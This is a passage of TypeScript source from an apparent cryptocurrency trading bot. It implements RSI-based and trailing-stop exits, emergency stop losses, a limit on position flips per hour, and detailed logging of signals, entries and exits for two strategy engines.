    this.emitter.emit("position", this.position);
  }

  private logTradeStats(): void {
    const stats = this.tradeStats.getStats();
    if (stats.totalTrades > 0) {
      this.log("📊 Trade Statistics", {
        totalTrades: stats.totalTrades,
        winRate: `${stats.winRate.toFixed(1)}%`,
        totalPnL: stats.totalPnL.toFixed(4),
        profitFactor: stats.profitFactor.toFixed(2),
        maxDrawdown: stats.maxDrawdown.toFixed(4),
        avgWin: stats.avgWin.toFixed(4),
        avgLoss: stats.avgLoss.toFixed(4),
      });
    }
  }

  private async evaluateProtectiveExits(bar: SyntheticBar) {
    if (this.position.side === "flat" || !this.position.entryPrice) {
      return;
    }
    
    // Protección: no cerrar posiciones inmediatamente después de abrirlas (excepto stop loss de emergencia)
    // Use bar timestamp for consistency with cooldown calculations
    const timeSinceEntry = bar.endTime - (this.position.openedAt || this.lastPositionEntryTime);
    const minTimeBeforeExit = 30_000; // 30 segundos mínimo antes de permitir cierres protectivos
    
    const { stopLossPct, emergencyStopLoss, useStopLoss } = this.config.risk;
    const { close } = bar;

    let v2Rsi: number | null = null;
    let watermelonRsi: number | null = null;

    if (this.isPeachHybrid) {
      try {
        const indicators = (this.engine as PeachHybridEngine).getIndicatorValues();
        v2Rsi = indicators.v2.rsi;
      } catch {
        v2Rsi = null;
      }
    } else {
      try {
        const indicators = (this.engine as WatermellonEngine).getIndicatorValues();
        watermelonRsi = indicators.rsi;
      } catch {
        watermelonRsi = null;
      }
    }

    if (this.isPeachHybrid && v2Rsi !== null && timeSinceEntry >= minTimeBeforeExit) {
      if (this.position.side === "long" && v2Rsi > 75) {
        const profitPct = ((close - this.position.entryPrice) / this.position.entryPrice) * 100;
        this.log("Exiting long - RSI overbought", {
          rsi: v2Rsi.toFixed(2),
          profitPct: profitPct.toFixed(2) + '%',
          close,
        });
        await this.closePosition("rsi-overbought", { close, rsi: v2Rsi, profitPct });
        return;
      }
      if (this.position.side === "short" && v2Rsi < 25) {
        const profitPct = ((this.position.entryPrice - close) / this.position.entryPrice) * 100;
        this.log("Exiting short - RSI oversold", {
          rsi: v2Rsi.toFixed(2),
          profitPct: profitPct.toFixed(2) + '%',
          close,
        });
        await this.closePosition("rsi-oversold", { close, rsi: v2Rsi, profitPct });
        return;
      }
    }

    if (!this.isPeachHybrid && useStopLoss) {
      const entryPrice = this.position.entryPrice!;
      const profitPct = this.position.side === "long"
        ? ((close - entryPrice) / entryPrice) * 100
        : ((entryPrice - close) / entryPrice) * 100;

      if (stopLossPct && profitPct <= -Math.abs(stopLossPct)) {
        this.log("Watermelon stop loss triggered", {
          profitPct: profitPct.toFixed(2) + '%',
          stopLossPct,
          close,
        });
        await this.closePosition("watermelon-stop-loss", { close, profitPct });
        return;
      }

      // Take profit disabled per client request - they don't want set TP
      // Client prefers to ride positions and exit based on exit conditions only
      // if (takeProfitPct && takeProfitPct > 0 && profitPct >= takeProfitPct) {
      //   this.log("Watermelon take profit triggered", {
      //     profitPct: profitPct.toFixed(2) + '%',
      //     takeProfitPct,
      //     close,
      //   });
      //   this.closePosition("watermelon-take-profit", { close, profitPct });
      //   return;
      // }

      if (watermelonRsi !== null && timeSinceEntry >= minTimeBeforeExit) {
        if (this.position.side === "long" && watermelonRsi > 75 && profitPct > 0.5) {
          this.log("Watermelon exiting long - RSI overbought", {
            rsi: watermelonRsi.toFixed(2),
            profitPct: profitPct.toFixed(2) + '%',
          });
          await this.closePosition("watermelon-rsi-overbought", { close, rsi: watermelonRsi, profitPct });
          return;
        }
        if (this.position.side === "short" && watermelonRsi < 25 && profitPct > 0.5) {
          this.log("Watermelon exiting short - RSI oversold", {
            rsi: watermelonRsi.toFixed(2),
            profitPct: profitPct.toFixed(2) + '%',
          });
          await this.closePosition("watermelon-rsi-oversold", { close, rsi: watermelonRsi, profitPct });
          return;
        }
      }
    }

    if (this.position.side === "long") {
      if (this.highestPrice === null || close > this.highestPrice) {
        this.highestPrice = close;
      }
    } else if (this.position.side === "short") {
      if (this.lowestPrice === null || close < this.lowestPrice) {
        this.lowestPrice = close;
      }
    }

    // Scale-out logic disabled per client request - they want to ride full positions
    // Client prefers full position management without partial exits

    if (this.isPeachHybrid && timeSinceEntry >= minTimeBeforeExit) {
      const trailingStopPct = 0.3;
      if (this.position.side === "long" && this.highestPrice !== null) {
        const currentProfit = ((close - this.position.entryPrice) / this.position.entryPrice) * 100;
        if (currentProfit > 0.3) {
          const trailingStopPrice = this.highestPrice * (1 - trailingStopPct / 100);
          if (close <= trailingStopPrice) {
            this.log("Trailing stop-loss triggered", { 
              trailingStopPrice: trailingStopPrice.toFixed(4), 
              highestPrice: this.highestPrice.toFixed(4),
              currentProfit: currentProfit.toFixed(2) + '%',
              close 
            });
            await this.closePosition("trailing-stop", { close, trailingStopPrice, highestPrice: this.highestPrice });
            return;
          }
        }
      } else if (this.position.side === "short" && this.lowestPrice !== null) {
        const currentProfit = ((this.position.entryPrice - close) / this.position.entryPrice) * 100;
        if (currentProfit > 0.3) {
          const trailingStopPrice = this.lowestPrice * (1 + trailingStopPct / 100);
          if (close >= trailingStopPrice) {
            this.log("Trailing stop-loss triggered", { 
              trailingStopPrice: trailingStopPrice.toFixed(4), 
              lowestPrice: this.lowestPrice.toFixed(4),
              currentProfit: currentProfit.toFixed(2) + '%',
              close 
            });
            await this.closePosition("trailing-stop", { close, trailingStopPrice, lowestPrice: this.lowestPrice });
            return;
          }
        }
      }
    }

    const effectiveStopLoss = this.isPeachHybrid ? 1.0 : (emergencyStopLoss || 2.0);
    if (effectiveStopLoss > 0 && (this.isPeachHybrid || useStopLoss)) {
      const emergencyThreshold =
        this.position.side === "long"
          ? this.position.entryPrice * (1 - effectiveStopLoss / 100)
          : this.position.entryPrice * (1 + effectiveStopLoss / 100);

      if ((this.position.side === "long" && close <= emergencyThreshold) || (this.position.side === "short" && close >= emergencyThreshold)) {
        this.log("Emergency stop-loss triggered", { 
          threshold: emergencyThreshold.toFixed(4), 
          stopLossPct: effectiveStopLoss.toFixed(2) + '%',
          close, 
          entryPrice: this.position.entryPrice 
        });
        await this.closePosition("emergency-stop", { close, threshold: emergencyThreshold });
        return;
      }
    }

    if (stopLossPct && stopLossPct > 0 && useStopLoss) {
      const threshold =
        this.position.side === "long"
          ? this.position.entryPrice * (1 - stopLossPct / 100)
          : this.position.entryPrice * (1 + stopLossPct / 100);

      if ((this.position.side === "long" && close <= threshold) || (this.position.side === "short" && close >= threshold)) {
        this.log("Stop-loss triggered", { threshold, close });
        await this.closePosition("stop-loss", { close, threshold });
        return;
      }
    }

    // Take profit disabled per client request - they don't want set TP
    // Client prefers to ride positions and exit based on exit conditions only
    // if (takeProfitPct && takeProfitPct > 0 && timeSinceEntry >= minTimeBeforeExit) {
    //   const profitPct = this.position.side === "long"
    //     ? ((close - this.position.entryPrice) / this.position.entryPrice) * 100
    //     : ((this.position.entryPrice - close) / this.position.entryPrice) * 100;
    //
    //   const target =
    //     this.position.side === "long"
    //       ? this.position.entryPrice * (1 + takeProfitPct / 100)
    //       : this.position.entryPrice * (1 - takeProfitPct / 100);
    //
    //   if ((this.position.side === "long" && close >= target) || (this.position.side === "short" && close <= target)) {
    //     this.log("Take-profit triggered", { target, close, profitPct: profitPct.toFixed(2) + '%' });
    //     this.closePosition("take-profit", { close, target });
    //   }
    // }
  }

  private canFlip(timestamp: number): boolean {
    const windowStart = timestamp - HOUR_MS;
    this.flipHistory = this.flipHistory.filter((t) => t >= windowStart);
    if (this.flipHistory.length >= this.config.risk.maxFlipsPerHour) {
      return false;
    }
    return true;
  }

  private recordFlip(timestamp: number) {
    this.flipHistory.push(timestamp);
  }

  private logSignal(signal: StrategySignal, bar: SyntheticBar, action: "TAKEN" | "SKIPPED", skipReason?: string, riskRewardRatio?: number): void {
    if (!signal) return;
    
    try {
      const indicators = this.isPeachHybrid
        ? (this.engine as PeachHybridEngine).getIndicatorValues()
        : (this.engine as WatermellonEngine).getIndicatorValues();

      const marketConditions: {
        adx?: number | null;
        adxReady?: boolean;
        marketRegime?: "trending" | "ranging" | "warming up";
      } = {};

      if (this.isPeachHybrid) {
        const peachIndicators = indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>;
        marketConditions.adx = peachIndicators.adx;
        marketConditions.adxReady = peachIndicators.adx !== null;
        marketConditions.marketRegime = peachIndicators.adx === null
          ? "warming up"
          : (this.engine as PeachHybridEngine).shouldAllowTrading(this.config.risk.adxThreshold)
          ? "trending"
          : "ranging";
      }

      this.tradeLogger.logSignal({
        signalType: signal.type,
        signalReason: signal.reason,
        bar: {
          open: bar.open,
          high: bar.high,
          low: bar.low,
          close: bar.close,
          volume: bar.volume,
          timestamp: bar.endTime,
        },
        indicators: this.isPeachHybrid
          ? {
              v1: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).v1,
              v2: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).v2,
              adx: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).adx,
              atr: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).atr,
              recentHigh: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).recentHigh,
              recentLow: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).recentLow,
            }
          : {
              emaFast: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).emaFast,
              emaMid: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).emaMid,
              emaSlow: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).emaSlow,
              rsi: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).rsi,
            },
        marketConditions,
        action,
        skipReason,
        riskRewardRatio,
      });
    } catch (error) {
      console.error("[TradeLogger] Failed to log signal:", error);
    }
  }

  private logEntry(side: "long" | "short", order: Parameters<ExecutionAdapter["enterLong"]>[0], bar: SyntheticBar): void {
    try {
      if (!this.lastBar) return;

      const indicators = this.isPeachHybrid
        ? (this.engine as PeachHybridEngine).getIndicatorValues()
        : (this.engine as WatermellonEngine).getIndicatorValues();

      let stopLossPrice: number | undefined;
      let takeProfitPrice: number | undefined;
      let riskRewardRatio: number | undefined;
      let riskDistance: number | undefined;
      let rewardDistance: number | undefined;

      if (this.isPeachHybrid) {
        const peachIndicators = indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>;
        const atr = peachIndicators.atr ?? null;
        const recentHigh = peachIndicators.recentHigh ?? null;
        const recentLow = peachIndicators.recentLow ?? null;

        if (atr && atr > 0) {
          const entryPrice = order.price;
          if (side === "long") {
            const atrStop = entryPrice - (atr * 1.5);
            stopLossPrice = recentLow && recentLow < entryPrice ? Math.min(recentLow * 0.999, atrStop) : atrStop;
            riskDistance = entryPrice - stopLossPrice;
            takeProfitPrice = entryPrice + (riskDistance * 2);
            rewardDistance = takeProfitPrice - entryPrice;
          } else {
            const atrStop = entryPrice + (atr * 1.5);
            stopLossPrice = recentHigh && recentHigh > entryPrice ? Math.max(recentHigh * 1.001, atrStop) : atrStop;
            riskDistance = stopLossPrice - entryPrice;
            takeProfitPrice = entryPrice - (riskDistance * 2);
            rewardDistance = entryPrice - takeProfitPrice;
          }
          riskRewardRatio = riskDistance > 0 ? rewardDistance / riskDistance : 0;
        }
      }

      const marketConditions: {
        adx?: number | null;
        adxReady?: boolean;
        marketRegime?: "trending" | "ranging" | "warming up";
        atr?: number | null;
      } = {};

      if (this.isPeachHybrid) {
        const peachIndicators = indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>;
        marketConditions.adx = peachIndicators.adx;
        marketConditions.adxReady = peachIndicators.adx !== null;
        marketConditions.atr = peachIndicators.atr;
        marketConditions.marketRegime = peachIndicators.adx === null
          ? "warming up"
          : (this.engine as PeachHybridEngine).shouldAllowTrading(this.config.risk.adxThreshold)
          ? "trending"
          : "ranging";
      }

      this.tradeLogger.logEntry({
        side,
        entryPrice: order.price,
        size: order.size,
        leverage: order.leverage,
        stopLossPrice,
        takeProfitPrice,
        riskRewardRatio,
        riskDistance,
        rewardDistance,
        bar: {
          open: bar.open,
          high: bar.high,
          low: bar.low,
          close: bar.close,
          volume: bar.volume,
          timestamp: bar.endTime,
        },
        indicators: this.isPeachHybrid
          ? {
              v1: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).v1,
              v2: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).v2,
              adx: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).adx,
              atr: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).atr,
              recentHigh: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).recentHigh,
              recentLow: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).recentLow,
            }
          : {
              emaFast: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).emaFast,
              emaMid: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).emaMid,
              emaSlow: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).emaSlow,
              rsi: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).rsi,
            },
        marketConditions,
        signalReason: order.signalReason || "unknown",
        balance: this.usdtBalance,
        riskParams: {
          maxPositionSize: this.config.risk.maxPositionSize,
          maxLeverage: this.config.risk.maxLeverage,
          stopLossPct: this.config.risk.stopLossPct ?? 0,
          takeProfitPct: this.config.risk.takeProfitPct ?? 0,
        },
      });
    } catch (error) {
      console.error("[TradeLogger] Failed to log entry:", error);
    }
  }

  private logExit(side: "long" | "short", entryPrice: number, exitPrice: number, size: number, leverage: number, reason: string, bar: SyntheticBar): void {
    try {
      if (!this.position.openedAt) return;

      const duration = Date.now() - this.position.openedAt;
      const pnl = (exitPrice - entryPrice) * size * (side === "long" ? 1 : -1);
      const pnlPercent = ((exitPrice - entryPrice) / entryPrice) * 100 * (side === "long" ? 1 : -1) * leverage;

      const indicators = this.isPeachHybrid
        ? (this.engine as PeachHybridEngine).getIndicatorValues()
        : (this.engine as WatermellonEngine).getIndicatorValues();

      const marketConditions: {
        adx?: number | null;
        atr?: number | null;
      } = {};

      if (this.isPeachHybrid) {
        const peachIndicators = indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>;
        marketConditions.adx = peachIndicators.adx;
        marketConditions.atr = peachIndicators.atr;
      }

      this.tradeLogger.logExit({
        side,
        entryPrice,
        exitPrice,
        size,
        leverage,
        pnl,
        pnlPercent,
        duration,
        exitReason: reason,
        bar: {
          open: bar.open,
          high: bar.high,
          low: bar.low,
          close: bar.close,
          volume: bar.volume,
          timestamp: bar.endTime,
        },
        indicators: this.isPeachHybrid
          ? {
              v1: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).v1,
              v2: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).v2,
              adx: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).adx,
              atr: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).atr,
              recentHigh: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).recentHigh,
              recentLow: (indicators as ReturnType<PeachHybridEngine["getIndicatorValues"]>).recentLow,
            }
          : {
              emaFast: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).emaFast,
              emaMid: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).emaMid,
              emaSlow: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).emaSlow,
              rsi: (indicators as ReturnType<WatermellonEngine["getIndicatorValues"]>).rsi,
            },
        marketConditions,
        balance: this.usdtBalance,
      });
    } catch (error) {
      console.error("[TradeLogger] Failed to log exit:", error);
    }
  }

  private log(message: string, payload?: Record<string, unknown>) {
    this.emitter.emit("log", message, payload);
    if (message.includes("position") || message.includes("signal") || message.includes("reconciliation")) {
      this.saveState();
    }
    if (payload) {
      KeyManager.safeLog(`[BotRunner] ${message}`, payload);
    } else {
      console.log(`[BotRunner] ${message}`);
    }
  }
}

